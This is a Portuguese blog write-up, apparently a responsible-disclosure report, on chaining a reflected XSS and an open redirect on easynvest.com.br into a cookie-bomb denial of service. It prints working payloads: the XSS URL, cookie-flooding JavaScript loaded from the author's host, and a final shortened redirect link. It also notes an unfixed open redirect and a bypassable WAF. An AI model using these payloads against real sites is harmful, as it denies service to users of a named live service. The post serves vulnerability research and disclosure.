---
layout: content
title: 'Encadeamento de vulnerabilidades client-side para geração de Indisponibilidade em aplicação web'
description: ''
og_image: https://heitorgouvea.me/images/publications/nuinvest/xss-triaged.png
---

Tabela de conteúdo:
* [Resumo](#resumo)
* [Descrição](#descrição)
* [Prova de conceito](#prova-de-conceito)
* [Impacto](#impacto)
* [Conclusão](#conclusão)
* [Referências](#referências)

---

### Resumo

Durante uma análise na aplicação web da corretora easynvest.com.br (adquirida pelo Nubank), foram identificadas duas vulnerabilidades client-side que, quando exploradas em conjunto, podem colocar em risco a disponibilidade do serviço para usuários legítimos. Especificamente, observou-se a possibilidade de provocar uma condição de negação de serviço (DoS) a partir da combinação dessas falhas.

Aviso: a empresa responsável foi informada sobre todos os detalhes contidos nesta publicação no menor tempo possível e se posicionou de forma ética e transparente, demonstrando a devida atenção e comprometimento. Durante todos os testes, nenhum sistema foi invadido ou comprometido, além disso, a empresa realizou algumas das ações/modificações necessárias para minimizar qualquer ação indevida que explore o contexto abordado nesta publicação.

---

### Descrição

A aplicação analisada disponibiliza uma funcionalidade de geração de links de convite personalizados, com parâmetros visíveis na URL, conforme o exemplo:

![Imagem](/images/publications/nuinvest/link-indique.png)

[https://indique.easynvest.com.br?nome=heitor%20REDACTED&id=[NUMERICAL ID REDACTED]]()

![Imagem](/images/publications/nuinvest/site.png)

Ao acessar o link, os parâmetros fornecidos são refletidos diretamente na interface da aplicação, o que pode indica a possibilidade de presença de uma vulnerabilidade do tipo XSS refletido ([1], [2]). Foi identificado que  o parâmetro ?nome= estava vulnerável, o payload explorando essa característica foi este:

[https://indique.easynvest.com.br/?nome=<audio src/onerror=alert(1)>&id=1]()

![Imagem](/images/publications/nuinvest/xss-triaged.png)
￼
Apesar da presença da vulnerabilidade, sua exploração direta apresenta limitações relevantes:

* O código vulnerável está presente em um subdomínio, impedindo o acesso ao LocalStorage do domínio principal;
* Os cookies disponíveis são acessíveis, porém os que contêm informações sensíveis estão configurados com a flag HTTPOnly;
* Trata-se de um XSS do tipo "refletido", dificultando a disseminação automática do payload;
* O domínio principal da aplicação apresenta mecanismos robustos de segurança, incluindo tokens anti-CSRF e cabeçalhos HTTP como X-Frame-Options (XFO), Content Security Policy (CSP) e Cross-Origin Resource Sharing (CORS) devidamente configurados.

Dada a limitação do XSS refletido isolado, buscou-se identificar outra vulnerabilidade que pudesse ser combinada para amplificar o impacto. A análise do código JavaScript da tela de autenticação revelou a presença de uma vulnerabilidade de Open Redirect ([3], [4]):

[https://www.easynvest.com.br/autenticacao?redirect_url=https://google.com]()

Demo:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/sN1J3py9aUo" title="Open Redirect - Easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

Esse redirecionamento não validado, localizado no domínio principal da aplicação, permite a disseminação de cargas maliciosas de forma mais confiável, mitigando parcialmente as restrições impostas pelo XSS refletido. No entanto, tentativas de exploração com objetivos mais críticos — como Account Takeover, exfiltração de dados ou execução de ações sensíveis — foram ineficazes devido à implementação de autenticação multifator (MFA) para operações de maior risco ([7]).

Considerando essas restrições, avaliou-se a viabilidade de um vetor alternativo: o ataque do tipo Cookie Bomb, cujo objetivo é tornar a aplicação indisponível para o usuário que interagir com um link malicioso. Esse ataque consiste na inserção massiva de cookies com carga excessiva, excedendo os limites aceitáveis pelo servidor. Como resultado, o servidor pode recusar as requisições subsequentes oriundas do navegador comprometido, impedindo o carregamento da aplicação e, consequentemente, gerando uma condição de negação de serviço (DoS).

De modo geral, navegadores permitem o envio de múltiplos cookies, cada um com limite aproximado de 4KB. Contudo, servidores web podem falhar ao processar esse volume excessivo de dados, causando indisponibilidade até que os cookies sejam removidos manualmente pelo usuário, ou expirem.

Para um entendimento aprofundado desse tipo de ataque, recomenda-se a leitura dos trabalhos “Cookie Bomb or Let's Break the Internet” [9], de Egor Homakov, e “Denial of Service with Cookie Bomb” [10], de filedescriptor.


---

### Prova de Conceito

A seguir, descreve-se a cadeia de exploração:

1. Inicialmente, devemos hospedar uma aplicação JavaScript que crie cookies maliciosos para o nosso alvo:

```
var base_domain = document.domain.substr(document.domain.indexOf('.'));
var pollution   = Array(4000).join('a');

for (var i = 1; i < 99; i++) {
    document.cookie='bomb' + i + '=' + pollution + ';Domain=' + base_domain + ";path=/";
}

window.location="https://" + document.domain;
```

	* Hospedado em: https://heitorgouvea.me/public/payloads/bomb.js

2. Execução via XSS Refletido:

[https://indique.easynvest.com.br/?nome=><audio src="" onerror=import('//heitorgouvea.me/public/payloads/bomb.js');>&id=1]()

3. Encaminhamento do usuário via Open Redirect, utilizando um serviço de encurtamento de URLs para mascarar o payload: [https://cutt.ly/syPnJXp]()

Payload final: [https://easynvest.com.br/autenticacao?redirect_url=https://cutt.ly/syPnJXp]()

E esse é o resultado:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/-L2pl1Ke_Lo" title="Cookie Bomb - easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

---

### Impacto

A cadeia de exploração permite que um atacante cause indisponibilidade localizada da aplicação web para usuários específicos. Isso ocorre pela injeção de um grande número de cookies (cookie pollution), que excede os limites esperados pelo servidor, impossibilitando o carregamento da aplicação até que os cookies sejam manualmente removidos pelo usuário. Embora este estudo tenha focado apenas em um vetor de impacto (DoS), outras possibilidades de exploração podem surgir a partir do mesmo vetor, dependendo das configurações da aplicação.

---

### Conclusão

A exploração demonstrada exige baixo esforço técnico e operacional, porém pode gerar impacto significativo ao usuário final. A utilização combinada de um XSS refletido e um Open Redirect viabiliza um ataque de negação de serviço via Cookie Bomb, um vetor pouco comum, porém eficaz em contextos específicos.

Após contato com a empresa, foram adotadas as seguintes medidas:

* Não foi implementada uma correção definitiva para a vulnerabilidade de Open Redirect;
* A mitigação do XSS refletido foi realizada por meio de regras no Web Application Firewall (WAF), embora tenham sido identificadas formas de contornar essa proteção. Argumentações técnicas foram apresentadas à empresa, sem retorno conclusivo até o momento.

---

### Referências

- [1] [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)
- [2] [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)
- [3] [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [4] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [5] [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [6] [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [7] [https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)
- [8] [https://en.wikipedia.org/wiki/HTTP_cookie](https://en.wikipedia.org/wiki/HTTP_cookie)
- [9] [https://blog.innerht.ml/tag/cookie-bomb/](https://blog.innerht.ml/tag/cookie-bomb/)
- [10] [https://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html](https://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html)